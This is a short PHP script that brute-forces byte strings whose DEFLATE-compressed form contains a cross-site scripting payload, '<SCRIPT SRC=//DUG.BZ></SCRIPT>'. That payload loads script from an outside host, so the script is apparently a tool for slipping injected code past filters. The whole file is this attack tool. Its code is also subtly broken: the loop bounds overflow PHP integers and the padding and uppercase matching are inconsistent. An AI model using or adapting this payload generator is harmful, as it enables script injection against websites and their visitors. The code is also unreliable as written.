<?php
$fileName = 'validhexstring.txt';
$current = file_get_contents($fileName);
for ($i = 0x000000000000000000000000000000000000000000000000000000000000000000000; $i < 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff; $i++) {
 $brute = implode('', 
    str_split(str_pad(dechex($i), 
      32, 
      '0', 
      STR_PAD_LEFT), 
    2));
  try{
    $deflate = gzdeflate(hex2bin($brute));
    if (strpos(strtoupper($deflate), '<SCRIPT SRC=//DUG.BZ></SCRIPT>') !== false) {
    $filecontents = bin2hex($deflate);
    file_put_contents($fileName, $filecontents);
}
	}
  catch(exception $e)
{
//
}
 
}
?>
